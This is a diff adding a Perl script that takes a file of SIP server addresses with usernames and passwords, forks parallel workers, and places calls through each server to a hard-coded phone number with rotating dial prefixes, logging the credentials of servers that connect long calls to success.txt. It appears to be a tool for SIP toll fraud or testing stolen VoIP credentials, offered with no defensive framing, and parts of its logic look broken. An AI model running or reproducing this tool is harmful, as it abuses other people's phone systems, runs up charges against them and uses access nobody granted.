@@ -1,0 +1,138 @@
+use IO::Socket::SSL;
+use Net::SIP;
+use Parallel::ForkManager;
+use Term::ANSIColor;
+use Time::HiRes qw(gettimeofday tv_interval);
+use strict;
+use warnings;
+
+if (@ARGV < 3) {
+    print "[!] $0 <ip_file> <threads> <timeout>\n";
+    exit;
+}
+
+my ($ips_file, $max_processes, $timeout) = @ARGV;
+my $num = '972599422641';
+my $call_prefixes_file = 'callprefixes';
+my $ring_time = 40;
+
+# Read IP addresses from file
+open my $ips_handle, '<', $ips_file or die "Cannot open $ips_file: $!";
+my @ips = map { chomp; $_ } <$ips_handle>;
+close $ips_handle;
+
+# Read call prefixes from file
+open my $call_prefixes_handle, '<', $call_prefixes_file or die "Cannot open $call_prefixes_file: $!";
+my @call_prefixes = map { chomp; $_ } <$call_prefixes_handle>;
+close $call_prefixes_handle;
+
+# Initialize Fork Manager
+my $pm = Parallel::ForkManager->new($max_processes);
+
+# Main loop
+foreach my $call_prefix (@call_prefixes) {
+    foreach my $line (@ips) {
+        my ($target, $user, $pass) = split(/ /, $line);
+        my ($ip, $port) = split(/:/, $target);
+        $ip =~ s/\x0a//g;
+        print color("bold red"), "$ip $user $pass $port\n";
+
+        # Fork a child process for each IP address
+        my $pid = $pm->start and next;
+        call($ip, $port, $user, $pass, $call_prefix);
+        $pm->finish;
+    }
+    print color("bold red"), "Switching $call_prefix$num\n";
+}
+
+$pm->wait_all_children();
+
+sub call {
+    my ($ip, $port, $user, $pass, $call_prefix) = @_;
+
+    # Set an alarm to detect timeout
+    alarm($timeout);
+
+    # Create a SSL socket to connect to the SIP server
+    my $socket = IO::Socket::SSL->new(
+        PeerAddr         => $ip,
+        PeerPort         => $port,
+        SSL_verify_mode => 0
+    );
+
+    # Check if the SSL socket was created successfully
+    if (!$socket) {
+        return;
+    }
+
+    # Create a Net::SIP client for making the call
+    my $fake_user = 'fake_username';
+    my $fake_pass = 'fake_password';
+    my $ua = Net::SIP::Simple->new(
+        outgoing_proxy => $socket,
+        registrar      => $socket,
+        from           => $fake_user,
+        auth           => [$fake_user, $fake_pass]
+    );
+
+    # Start a timer to measure the duration of the call
+    my $t1 = [gettimeofday];
+    my $done;
+
+    # Make the call
+    $ua->invite(
+        "$call_prefix$num",
+        init_media => sub {
+            my $t2 = [gettimeofday];
+            my $t0_t1 = tv_interval $t1, $t2;
+            if ($t0_t1 > 15) {
+                my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = localtime(time);
+                my $call_info = {
+                    ip => $ip,
+                    port => $port,
+                    user => $user,
+                    pass => $pass,
+                    prefix => $call_prefix,
+                    time => "$hour:$min:$sec",
+                    duration => $t0_t1
+                };
+                print color("bold Green"), "Call Made\n";
+                print color("bold Green"), "IP: $ip\n";
+                print color("bold Green"), "Port: $port\n";
+                print color("bold Green"), "User: $user\n";
+                print color("bold Green"), "Pass: $pass\n";
+                print color("bold Green"), "Time: $hour:$min:$sec\n";
+                print color("bold Green"), "Duration: $t0_t1\n\n";
+                open(my $fh, '>>', 'success.txt') or die "Can't open success.txt: $!";
+                print $fh "$call_info->{ip} $call_info->{port} $call_info->{user} $call_info->{pass} $call_info->{prefix} $call_info->{time} $call_info->{duration}\n";
+                close $fh;
+            }
+        },
+        cb_established => sub { diag("call established $ip $port $user، $pass $call_prefix$num"); $done = 1; },
+        cb_disconnect => sub { diag("call disconnected $ip $port $user, $pass $call_prefix$num"); },
+        cb_ringing => sub { diag("ringing $ip $port $user $pass $call_prefix$num"); },
+        cb_error => sub { diag("error $ip $port $user $pass $call_prefix$num"); },
+        timeout => $ring_time
+    );
+
+    # Wait for the call to complete or timeout
+    while (!$done) {
+        sleep(1);
+    }
+
+    # Close the SSL socket
+    close($socket);
+}
+
+sub diag {
+    my $msg = shift;
+    print color("bold Yellow"), "$msg\n";
+} 
+
+# Reset the alarm
+alarm(0);
+
+print color("bold Green"), "All calls completed successfully\n";
+
+# Exit the program
+exit(0);
